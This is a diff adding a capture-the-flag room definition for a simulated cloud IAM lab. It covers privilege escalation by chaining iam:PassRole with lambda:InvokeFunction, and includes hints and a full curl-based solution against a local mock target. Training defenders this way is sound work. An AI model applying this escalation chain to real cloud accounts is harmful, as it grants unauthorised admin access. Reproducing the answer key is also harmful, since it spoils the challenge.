@@ -1,0 +1,116 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: role-play
+  title: 'Role Play'
+  version: 1.0.0
+  difficulty: medium
+  points: 250
+  estimated_minutes: 45
+  tags: [cloud-concepts, iam-simulation, privesc, passrole, simulation]
+spec:
+  track: defense-cloud
+  type: challenge
+  summary: >-
+    Cloud IAM rarely fails through one dramatic grant; it fails through
+    two harmless-looking ones that compose. This simulated identity plane
+    signs you in as a developer automation user whose policies allow
+    invoking exactly one function and passing exactly one role, and an
+    admin context endpoint sits behind both permissions stacked twice.
+    Read the policy documents, spot why iam:PassRole plus
+    lambda:InvokeFunction is a ladder, and climb it to the flag.
+  objectives:
+    - 'Read attached policy documents on the sim console and reason about what they authorize together.'
+    - 'Execute the two-hop PassRole plus InvokeFunction chain from your user through report-runner toward admin-role.'
+    - 'Present the final execution context to the admin endpoint and capture the per-session flag.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'http://target:8000'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: >-
+      Pure Flask JSON API with static policy dictionaries and
+      deterministic sha256 context tokens; no cloud SDK, no credentials,
+      no egress, nothing stateful beyond string comparison.
+  target:
+    privilege_profile: locked
+    build_context: ./target
+    ports: [8000]
+    healthcheck:
+      http_path: /healthz
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: chain-to-admin-context
+      title: 'Chain yourself into the admin context'
+      prompt: >-
+        On the sim console at http://target:8000 you are signed in as
+        dev-cli. Direct role assumption is denied to you, so that door is
+        painted shut. Instead, read your own policy document under /iam/
+        users/dev-cli, work out which function you may invoke and which
+        role you may pass, and use the invoke endpoint's documented
+        pass_role behavior to run inside that role's context. From there,
+        read the role's own policies and repeat the trick once more to
+        reach an admin-console invocation running as admin-role. Present
+        that final context token to GET /admin/context as a Bearer token
+        or X-Sim-Context header, and submit the FLAG value shown.
+      points: 250
+      hints:
+        - cost: 0
+          text: >-
+            Start with GET /whoami and GET /iam/users/dev-cli. Your
+            policy has three statements; two Allows name exactly one
+            function ARN and one role ARN, and the Deny explains why
+            assuming roles directly will not work.
+        - cost: 10
+          text: >-
+            POST /lambda/functions/nightly-report/invoke with body
+            {"pass_role":"report-runner"}. The response carries a
+            contextToken. Send it back as X-Sim-Context on later calls;
+            GET /whoami while wearing it confirms whose shoes you occupy.
+        - cost: 25
+          text: >-
+            As report-runner, GET /iam/roles/report-runner shows rights
+            to invoke admin-console and pass admin-role. Chain the same
+            call with X-Sim-Context set and pass_role admin-role, then
+            GET /admin/context with Authorization: Bearer <contextToken>.
+            The flag renders in the page.
+      solution: |
+        1. Confirm who you are and what you hold:
+           curl http://target:8000/whoami
+           curl http://target:8000/iam/users/dev-cli
+           The dev-deploy policy allows lambda:InvokeFunction on
+           arn:sim:lambda:...:function/nightly-report and iam:PassRole
+           on arn:sim:iam::111122223333:role/report-runner, while a Deny
+           blocks sts:AssumeRole entirely.
+        2. Hop one: attach report-runner to an invocation you may make:
+           curl -X POST http://target:8000/lambda/functions/nightly-report/invoke \
+                -H 'Content-Type: application/json' \
+                -d '{"pass_role":"report-runner"}'
+           The console checks both permissions, then returns executedAs
+           report-runner and a contextToken such as simctx-...
+        3. Verify the elevation took:
+           curl http://target:8000/whoami -H 'X-Sim-Context: <token1>'
+           The principal now reads report-runner.
+        4. Read the role you inhabit:
+           curl http://target:8000/iam/roles/report-runner
+           Its runner-ops policy allows lambda:InvokeFunction on
+           admin-console and iam:PassRole on admin-role. Same pattern,
+           next rung.
+        5. Hop two:
+           curl -X POST http://target:8000/lambda/functions/admin-console/invoke \
+                -H 'Content-Type: application/json' \
+                -H 'X-Sim-Context: <token1>' \
+                -d '{"pass_role":"admin-role"}'
+           Collect token2 from the response.
+        6. Spend it at the top:
+           curl http://target:8000/admin/context \
+                -H 'Authorization: Bearer <token2>'
+           Only this exact chained context unlocks the page, which
+           prints FLAG{...}. Submit it.
+      validator:
+        type: per_session_flag
